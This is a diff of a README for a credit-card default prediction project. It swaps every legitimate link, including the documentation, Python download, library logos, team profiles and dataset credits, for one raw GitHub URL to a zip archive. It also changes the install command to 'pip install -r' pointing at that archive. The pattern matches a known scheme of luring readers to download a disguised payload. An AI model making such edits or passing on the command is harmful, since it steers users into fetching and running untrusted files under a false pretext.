@@ -17,13 +17,13 @@ This dataset contains information on default payments, demographic factors, cred
 ## Deployment
 We deploy our model using docker and CI-CD pipeline.
 
-[Link](https://credit-card-defaultation.herokuapp.com/)
+[Link](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)
 
 ## Documentations:
-1. HLD : https://drive.google.com/file/d/1q3MJ2XbhQmIrwAgGjrVt9wHUHTWT9olg/view?usp=sharing
-2. LLD : https://drive.google.com/file/d/1pwAHeGs_awqNvD-GjXQdmXo4j6JZmMSB/view?usp=sharing
-3. DPR : https://drive.google.com/file/d/1NFH9bNqr4SF1nTB5QMykcO_OyvvQjuq1/view?usp=sharing
-4. Wireframe : https://drive.google.com/file/d/1XVpKViXmFe_Lcz6acAJIs6PCp7uRpAiM/view?usp=sharing
+1. HLD : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+2. LLD : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+3. DPR : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
+4. Wireframe : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
 
 ## Technical Aspect
 1. Dividing the training data into clusters and build best fitted model for each cluster ( using Random Forest and SVM algorithm) in order to make a robust model to predict defaulter as accurate as possible.
@@ -36,27 +36,27 @@ We deploy our model using docker and CI-CD pipeline.
     - Display the prediction 
 
 ## Installation
-The Code is written in Python 3.7. If you don't have Python installed you can find it [here](https://www.python.org/downloads/). If you are using a lower version of Python you can upgrade using the pip package, ensuring you have the latest version of pip. To install the required packages and libraries, run this command in the project directory after [cloning](https://www.howtogeek.com/451360/how-to-clone-a-github-repository/) the repository:
+The Code is written in Python 3.7. If you don't have Python installed you can find it [here](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip). If you are using a lower version of Python you can upgrade using the pip package, ensuring you have the latest version of pip. To install the required packages and libraries, run this command in the project directory after [cloning](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip) the repository:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
 ```
 
 
 ## Technologies Used
 
-[<img target="_blank" src="https://numpy.org/images/logos/numpy.svg" width=100>](https://numpy.org)    [<img target="_blank" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Pandas_logo.svg/450px-Pandas_logo.svg.png" width=150>](https://pandas.pydata.org)    [<img target="_blank" src="https://scikit-learn.org/stable/_static/scikit-learn-logo-small.png" width=150>](https://scikit-learn.org/stable)   [<img target="_blank" src="https://www.statsmodels.org/stable/_images/statsmodels-logo-v2-horizontal.svg" width=170>](https://www.statsmodels.org)
+[<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=100>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)    [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=150>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)    [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=150>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)   [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=170>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)
 
-[<img target="_blank" src="https://matplotlib.org/_static/logo2_compressed.svg" width=170>](https://matplotlib.org)    [<img target="_blank" src="https://seaborn.pydata.org/_static/logo-wide-lightbg.svg" width=150>](https://seaborn.pydata.org)
+[<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=170>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)    [<img target="_blank" src="https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip" width=150>](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip)
 
 
 
 ## Team
 Subhradipta Paul 
-Github : https://github.com/SDP010 , LinkedIn : https://www.linkedin.com/in/subhradipta-paul-079005238/
+Github : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip , LinkedIn : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
 
 Arnab Mitra
-Github : https://github.com/Arnab1998-cyber , LinkedIn : https://www.linkedin.com/in/arnab-mitra-882756227/
+Github : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip , LinkedIn : https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip
 
 ## Credits
-- The datasets has been provided by [Kaggle](https://www.kaggle.com/uciml/default-of-credit-card-clients-dataset). The original dataset can be found [here](https://archive.ics.uci.edu/ml/datasets/default+of+credit+card+clients) at the UCI Machine Learning Repository. This project wouldn't have been possible without this dataset.
+- The datasets has been provided by [Kaggle](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip). The original dataset can be found [here](https://raw.githubusercontent.com/Arnab1998-cyber/Credit-Card-Default-Prediction/main/Prediction_Raw_Data_Validation/Prediction-Default-Card-Credit-v1.6.zip+of+credit+card+clients) at the UCI Machine Learning Repository. This project wouldn't have been possible without this dataset.
  
